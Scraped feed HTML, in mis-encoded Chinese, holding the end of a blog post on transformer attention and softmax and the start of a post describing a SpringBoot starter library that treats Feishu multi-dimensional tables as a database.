<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20bc14ecd2c34b7d97063f169c5a2645~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=pf%2FU9Y1ZZ9G1zhC3357vTnCupKU%3D" alt="" loading="lazy"/></p>
<p>ä»è®¡ç®—ä¸Šçœ‹ï¼Œç‚¹ç§¯æ˜¯å°†æ‰€æœ‰çš„å¯¹é½åˆ†é‡ç›¸ä¹˜å¹¶ç´¯åŠ ï¼›ä»å‡ ä½•ä¸Šçœ‹ï¼Œå½“å‘é‡æŒ‡å‘ç›¸ä¼¼æ–¹å‘æ—¶ï¼Œç‚¹ç§¯ä¸ºæ­£ï¼Œå¦‚æœå‘é‡å‚ç›´ï¼Œç‚¹ç§¯ä¸º0ï¼Œå½“å‘é‡æ–¹å‘ç›¸åæ—¶åˆ™ä¸ºè´Ÿæ•°ã€‚</p>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªæ³¨æ„åŠ›åˆ†æ•°çŸ©é˜µï¼Œè¡¨ç¤ºæ¯ä¸ª token å¯¹å…¶ä»– token çš„<strong>æ³¨æ„åŠ›æƒé‡</strong>ã€‚</p>
<h2 data-id="heading-7">å››ã€ä¸ºä»€ä¹ˆè¦ç”¨ Softmaxï¼Ÿ</h2>
<p>é—®é¢˜æ¥äº†ï¼šæˆ‘ä»¬å·²ç»æœ‰äº†ç›¸ä¼¼åº¦åˆ†æ•°ï¼Œä¸ºä»€ä¹ˆè¿˜è¦å†è¿‡ä¸€é Softmaxï¼Ÿ</p>
<p>å…¶å®åŸå› å¾ˆç®€å•ï¼š</p>
<ol>
<li><strong>æŠŠâ€œç›¸ä¼¼åº¦â€å˜æˆâ€œæƒé‡åˆ†å¸ƒâ€</strong><br/>
ç‚¹ç§¯ç»“æœå¯ä»¥æ˜¯ä»»æ„å®æ•°ï¼Œè€Œ Softmax ä¼šæŠŠå®ƒä»¬å‹ç¼©åˆ° ( [0, 1] ) åŒºé—´ï¼Œå¹¶ä¸”æ‰€æœ‰æƒé‡ä¹‹å’Œä¸º 1ã€‚<br/>
è¿™è®©æ³¨æ„åŠ›åˆ†æ•°èƒ½è¢«è§£é‡Šä¸ºæ¦‚ç‡åˆ†å¸ƒï¼Œå³æ¨¡å‹åœ¨å…³æ³¨è°ã€å…³æ³¨å¤šå°‘ã€‚</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8069bf7529a64711b9cf9c52fb2991af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=8CVFjNuXSnO%2Fqs7xJnil4Lbqs0U%3D" alt="" loading="lazy"/></p>
<ol start="2">
<li><strong>æ”¾å¤§å¼ºå…³æ³¨ã€å‰Šå¼±å¼±å…³æ³¨</strong><br/>
Softmax æœ‰æŒ‡æ•°ç‰¹æ€§ï¼Œä¼šè®©å¤§çš„åˆ†æ•°æ›´å¤§ã€å°çš„åˆ†æ•°æ›´å°ï¼Œä»è€Œçªå‡ºä¸»å¯¼æ³¨æ„åŠ›ã€‚<br/>
è¿™åœ¨è¯­ä¹‰å»ºæ¨¡ä¸­éå¸¸å…³é”®â€”â€”æ¨¡å‹ä¸ä¼šå¹³å‡åœ°çœ‹æ‰€æœ‰ tokenï¼Œè€Œæ˜¯èƒ½<strong>èšç„¦é‡ç‚¹</strong>ã€‚</li>
<li><strong>æ¢¯åº¦ç¨³å®šæ€§</strong><br/>
å¦‚æœç›´æ¥ç”¨ç‚¹ç§¯åšåŠ æƒï¼Œåˆ†æ•°å¯èƒ½è¿‡å¤§æˆ–è¿‡å°ï¼Œå¯¼è‡´æ¢¯åº¦ä¸ç¨³å®šã€‚<br/>
Softmax ä¿è¯äº†æ•°å€¼èŒƒå›´å¯æ§ï¼Œæ¢¯åº¦ä¼ æ’­æ›´å¹³æ»‘ã€‚</li>
</ol>
<p>æœ€åä¸€æ­¥ï¼ŒæŠŠæ³¨æ„åŠ›æƒé‡ä¹˜ä¸Š Valueï¼š<br/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8372c1f342a478dbc2d308d1f2c1205~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=Tk4c3Qr%2FXEmr9C5Xlgc7IYTxp3s%3D" alt="image" loading="lazy"/><br/>
å°±å¾—åˆ°äº†æ¯ä¸ª token æ ¹æ®ä¸Šä¸‹æ–‡åŠ¨æ€åŠ æƒåçš„æ–°è¡¨ç¤ºã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹ï¼ŒQã€Kã€V çš„çº¿æ€§å˜æ¢æ˜¯ä¸ºäº†è®©æ¨¡å‹ä»åŒä¸€è¾“å…¥ä¸­ç”Ÿæˆ<strong>ä¸åŒåŠŸèƒ½çš„å‘é‡è¡¨ç¤º</strong>ï¼Œåˆ†åˆ«è´Ÿè´£æé—®ã€åŒ¹é…å’Œä¼ é€’ä¿¡æ¯ï¼Œå¢å¼ºæ¨¡å‹çš„è¡¨è¾¾çµæ´»æ€§ã€‚</p>
<p>Softmax çš„ä½œç”¨åˆ™æ˜¯æŠŠç›¸ä¼¼åº¦åˆ†æ•°è½¬æˆç¨³å®šçš„æ³¨æ„åŠ›åˆ†å¸ƒï¼Œçªå‡ºé‡ç‚¹å¹¶ä¿è¯æ¢¯åº¦å¯è®­ç»ƒã€‚</p>
<p><strong>ğŸ“š</strong> <strong>æ¨èé˜…è¯»</strong></p>
<p>â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1918047303597552480" target="_blank" title="https://zhuanlan.zhihu.com/p/1918047303597552480" ref="nofollow noopener noreferrer">ä¸€è§ˆTransformeræ•´ä½“æ¶æ„</a><br/>
â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1918049072331362469" target="_blank" title="https://zhuanlan.zhihu.com/p/1918049072331362469" ref="nofollow noopener noreferrer">Transformerâ€”â€”Attentionæ€ä¹ˆå®ç°é›†ä¸­æ³¨æ„åŠ›</a><br/>
â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1918050616376301224" target="_blank" title="https://zhuanlan.zhihu.com/p/1918050616376301224" ref="nofollow noopener noreferrer">Transformerâ€”â€”FeedForwardæ¨¡å—åœ¨å¹²ä»€ä¹ˆï¼Ÿ</a><br/>
â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1918357249883105145" target="_blank" title="https://zhuanlan.zhihu.com/p/1918357249883105145" ref="nofollow noopener noreferrer">ä»0å¼€å§‹å®ç°Transformer</a><br/>
â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1919338888536756837" target="_blank" title="https://zhuanlan.zhihu.com/p/1919338888536756837" ref="nofollow noopener noreferrer">ä»€ä¹ˆæ˜¯KV-Cache</a><br/>
â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1919500956946655189" target="_blank" title="https://zhuanlan.zhihu.com/p/1919500956946655189" ref="nofollow noopener noreferrer">Transformeræ³¨æ„åŠ›æœºåˆ¶â€”â€”MHA&amp;MQA&amp;GQA</a><br/>
â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1923328314241704991" target="_blank" title="https://zhuanlan.zhihu.com/p/1923328314241704991" ref="nofollow noopener noreferrer">FlashAttentionæ€ä¹ˆæå‡é€Ÿåº¦çš„ï¼Ÿ</a><br/>
â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1963547933044631464" target="_blank" title="https://zhuanlan.zhihu.com/p/1963547933044631464" ref="nofollow noopener noreferrer">é¢è¯•å®˜ï¼šBatchNormã€LayerNormã€GroupNormã€InstanceNorm æœ‰ä»€ä¹ˆæœ¬è´¨åŒºåˆ«ï¼Ÿ</a><br/>
â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1962254381677257759" target="_blank" title="https://zhuanlan.zhihu.com/p/1962254381677257759" ref="nofollow noopener noreferrer">é¢è¯•å®˜ï¼šTransformerå¦‚ä½•ä¼˜åŒ–åˆ°çº¿æ€§çº§ï¼Ÿ</a><br/>
â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1923714840653993730" target="_blank" title="https://zhuanlan.zhihu.com/p/1923714840653993730" ref="nofollow noopener noreferrer">FlashAttention2ï¼šæ›´å¿«çš„æ³¨æ„åŠ›æœºåˆ¶ï¼Œæ›´å¥½çš„å¹¶è¡Œæ•ˆç‡</a><br/>
â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1924154277082961318" target="_blank" title="https://zhuanlan.zhihu.com/p/1924154277082961318" ref="nofollow noopener noreferrer">FlashAttention3 å…¨è§£æï¼šé€Ÿåº¦ã€ç²¾åº¦ã€æ˜¾å­˜çš„å†å¹³è¡¡</a><br/>
â— <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1971661595559059790" target="_blank" title="https://zhuanlan.zhihu.com/p/1971661595559059790" ref="nofollow noopener noreferrer">Transformer ä¸­ä¸ºä»€ä¹ˆç”¨LayerNormè€Œä¸ç”¨BatchNormï¼Ÿ</a></p>
<p>å…³äºæ·±åº¦å­¦ä¹ å’ŒAIå¤§æ¨¡å‹ç›¸å…³çš„çŸ¥è¯†å’Œå‰æ²¿æŠ€æœ¯æ›´æ–°ï¼Œè¯·å…³æ³¨å…¬ä¼—å· <strong>aicoting</strong>ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot æ¥å…¥é£ä¹¦å¤šç»´è¡¨æ ¼ï¼Œå¿«é€Ÿè·‘é€šMVPåº”ç”¨]]></title>    <link>https://juejin.cn/post/7589092567544119305</link>    <guid>https://juejin.cn/post/7589092567544119305</guid>    <pubDate>2025-12-29T09:36:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589092567544119305" data-draft-id="7589093895326367753" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot æ¥å…¥é£ä¹¦å¤šç»´è¡¨æ ¼ï¼Œå¿«é€Ÿè·‘é€šMVPåº”ç”¨"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-29T09:36:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Corbing"/> <meta itemprop="url" content="https://juejin.cn/user/1284695418219886"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot æ¥å…¥é£ä¹¦å¤šç»´è¡¨æ ¼ï¼Œå¿«é€Ÿè·‘é€šMVPåº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1284695418219886/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Corbing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:36:43.000Z" title="Mon Dec 29 2025 09:36:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é¡¹ç›®åœ°å€ï¼š</h2>
<ul>
<li>Gitee: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fbdmcom%2Ffs-dw-table-springboot-starter" target="_blank" title="https://gitee.com/bdmcom/fs-dw-table-springboot-starter" ref="nofollow noopener noreferrer">gitee.com/bdmcom/fs-dâ€¦</a></li>
<li>GitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbendangmi%2Ffs-dw-table-springboot-starter" target="_blank" title="https://github.com/bendangmi/fs-dw-table-springboot-starter" ref="nofollow noopener noreferrer">github.com/bendangmi/fâ€¦</a></li>
</ul>
<h2 data-id="heading-1">é¡¹ç›®è¯´æ˜</h2>
<ul>
<li>å°†é£ä¹¦å¤šç»´è¡¨æ ¼ä½œä¸ºæ•°æ®æºï¼Œåƒæ“ä½œ MySQL ç­‰æ•°æ®åº“ä¸€æ ·å®Œæˆæ•°æ® CRUD</li>
<li>æŸ¥è¯¢èƒ½åŠ›å¯¹æ ‡ MyBatis-Plusï¼Œä½¿ç”¨ <code>DwLambdaQueryWrapper</code> å®Œæˆæ¡ä»¶æ„é€ </li>
<li>å±è”½åº•å±‚ Open API è°ƒç”¨ï¼Œå¼€å‘è€…åªéœ€å¼•å…¥ä¾èµ–å¹¶å¡«å†™é£ä¹¦é…ç½®</li>
</ul>
<h2 data-id="heading-2">æ¶æ„è®¾è®¡</h2>
<h3 data-id="heading-3">åˆ†å±‚æ¶æ„</h3>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        åº”ç”¨å±‚ (Application)                   â”‚
â”‚  FsDwRecordHelper / FsDwTableHelper / FsDwFieldHelper       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        æœåŠ¡å±‚ (Service)                      â”‚
â”‚     FsDwRecordService / FsDwTableService / FsDwFieldService â”‚
â”‚                      FsDwTokenService                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                         APIå±‚ (HTTP Client)                  â”‚
â”‚      FsDwRecordApi / FsDwTableApi / FsDwFieldApi             â”‚
â”‚                    (Forest å£°æ˜å¼ HTTP å®¢æˆ·ç«¯)                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      é£ä¹¦å¤šç»´è¡¨æ ¼ Open API                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-4">æ ¸å¿ƒç»„ä»¶</h3>













































<table><thead><tr><th>ç»„ä»¶</th><th>èŒè´£</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>@EnableFsDwTable</code></td><td>å¯ç”¨è‡ªåŠ¨é…ç½®</td><td>æ˜¾å¼å¯ç”¨ï¼Œé¿å…ä¸å…¶ä»–å®ç°å†²çª</td></tr><tr><td><code>FsDwAutoConfiguration</code></td><td>è‡ªåŠ¨é…ç½®ç±»</td><td>æ³¨å†Œæ‰€æœ‰æ ¸å¿ƒ Bean å¹¶æ‰«æ Forest æ¥å£</td></tr><tr><td><code>FsDwProperties</code></td><td>é…ç½®å±æ€§</td><td>ç»‘å®š <code>duoweitable.*</code> é…ç½®é¡¹</td></tr><tr><td><code>FsDwTokenService</code></td><td>Token ç®¡ç†</td><td>ä½¿ç”¨ Caffeine é«˜æ€§èƒ½ç¼“å­˜ï¼Œæ”¯æŒå¹¶å‘å’Œç»Ÿè®¡</td></tr><tr><td><code>DwLambdaQueryWrapper</code></td><td>æŸ¥è¯¢æ„é€ å™¨</td><td>MyBatis-Plus é£æ ¼çš„ Lambda ç±»å‹å®‰å…¨æŸ¥è¯¢</td></tr><tr><td><code>FsDwRecordHelper</code></td><td>è®°å½•æ“ä½œåŠ©æ‰‹</td><td>é™æ€å·¥å…·æ–¹æ³•ï¼Œä¾¿æ· CRUD æ“ä½œ</td></tr><tr><td><code>BitableException</code></td><td>ç»Ÿä¸€å¼‚å¸¸</td><td>æºå¸¦é”™è¯¯ç çš„å¼‚å¸¸ä½“ç³»</td></tr></tbody></table>
<h3 data-id="heading-5">æ³¨è§£ä½“ç³»</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FsDwAppBase(appToken = "app_token")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoAppBase</span> {
}

<span class="hljs-meta">@FsDwTable(name = "è¡¨å", tableId = "tblxxx", viewId = "vewxxx")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Entity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DemoAppBase</span> {
    <span class="hljs-meta">@FsDwTableId</span>                    <span class="hljs-comment">// æ ‡è®°è®°å½• ID å­—æ®µ</span>
    <span class="hljs-keyword">private</span> String recordId;

    <span class="hljs-meta">@FsDwTableProperty(value = "å­—æ®µå", order = 1, type = TypeEnum.TEXT)</span>
    <span class="hljs-keyword">private</span> String fieldName;
}
</code></pre>
<h3 data-id="heading-6">HTTP å®¢æˆ·ç«¯</h3>
<p>æœ¬é¡¹ç›®ä½¿ç”¨ <strong>Forest</strong> ä½œä¸º HTTP å®¢æˆ·ç«¯ï¼Œç›¸æ¯” RestTemplate/WebClientï¼š</p>
<ul>
<li>å£°æ˜å¼æ¥å£å®šä¹‰ï¼Œæ— éœ€æ‰‹å†™è¯·æ±‚ä»£ç </li>
<li>è‡ªåŠ¨ JSON åºåˆ—åŒ–/ååºåˆ—åŒ–</li>
<li>æ”¯æŒæ‹¦æˆªå™¨ã€è¿‡æ»¤å™¨ç­‰æ‰©å±•æœºåˆ¶</li>
<li>åº•å±‚ä½¿ç”¨ OkHttpï¼Œæ€§èƒ½ä¼˜å¼‚</li>
</ul>
<h3 data-id="heading-7">ç¼“å­˜ç­–ç•¥</h3>
<p><strong>Token ç¼“å­˜</strong> ä½¿ç”¨ Caffeineï¼š</p>
<ul>
<li>è‡ªåŠ¨è¿‡æœŸï¼ˆ2å°æ—¶ï¼‰</li>
<li>å¹¶å‘å®‰å…¨ï¼ˆåŸºäº ConcurrentHashMapï¼‰</li>
<li>LRU æ·˜æ±°ç­–ç•¥ï¼ˆæœ€å¤š 100 ä¸ª tokenï¼‰</li>
<li>æ”¯æŒç»Ÿè®¡ä¿¡æ¯ï¼ˆå‘½ä¸­ç‡ç­‰ï¼‰</li>
<li>æå‰ 60 ç§’åˆ·æ–°ç¼“å†²</li>
</ul>
<h2 data-id="heading-8">è§£å†³çš„é—®é¢˜</h2>
<ul>
<li>å…å» Token é‰´æƒã€è¯·æ±‚æ„é€ ã€å“åº”è§£æç­‰â€œèƒ¶æ°´å·¥ä½œâ€ï¼Œä¸šåŠ¡å±‚åªä¿ç•™ CRUD è¯­ä¹‰</li>
<li>ç»Ÿä¸€å­—æ®µæ˜ å°„ä¸ç±»å‹è½¬æ¢ï¼Œå‡å°‘æ‰‹å†™ JSON/Map ä¸å­—æ®µåä¸ä¸€è‡´çš„é£é™©</li>
<li>æä¾›ç±»æ•°æ®åº“çš„æ¡ä»¶æŸ¥è¯¢ä¸åˆ†é¡µèƒ½åŠ›ï¼Œè®©æ•°æ®è®¿é—®æ›´æ˜“ç»´æŠ¤ã€å¯è¯»</li>
</ul>
<h2 data-id="heading-9">é¡¹ç›®äº®ç‚¹</h2>
<ul>
<li>é€šè¿‡ @EnableFsDwTable æ˜¾å¼å¯ç”¨è‡ªåŠ¨é…ç½® + Forest æ‰«æï¼Œé¿å…ä¸å…¶ä»–å®ç°å†²çª</li>
<li>æ³¨è§£é©±åŠ¨å®ä½“æ˜ å°„ï¼ˆ<code>@FsDwAppBase</code> / <code>@FsDwTable</code> / <code>@FsDwTableProperty</code> / <code>@FsDwTableId</code>ï¼‰ï¼Œæ”¯æŒå…ƒå­—æ®µè¯»å–</li>
<li><code>DwLambdaQueryWrapper</code> æä¾› MyBatis-Plus é£æ ¼çš„æ¡ä»¶ã€æ’åºã€åˆ†é¡µä¸å­—æ®µé€‰æ‹©</li>
<li>è®°å½•/è¡¨/å­—æ®µå¤šå±‚çº§ Helper ä¸ Service ç»„åˆï¼Œå…¼é¡¾ç®€å•è°ƒç”¨ä¸å¯æ‰©å±•é›†æˆ</li>
<li>Token å†…å­˜ç¼“å­˜ + æå‰åˆ·æ–°ç¼“å†²ï¼Œé™ä½é¢‘ç¹é‰´æƒè¯·æ±‚</li>
<li>ç»Ÿä¸€é”™è¯¯ç ä¸æ–­è¨€ä½“ç³»ï¼ˆ<code>BitableException</code> / <code>BitableErrorCode</code>ï¼‰</li>
</ul>
<h2 data-id="heading-10">åŠŸèƒ½ç‰¹æ€§</h2>
<ul>
<li>å¯ç”¨æ³¨è§£åè‡ªåŠ¨é…ç½®å¹¶æ‰«æ Forest HTTP å®¢æˆ·ç«¯</li>
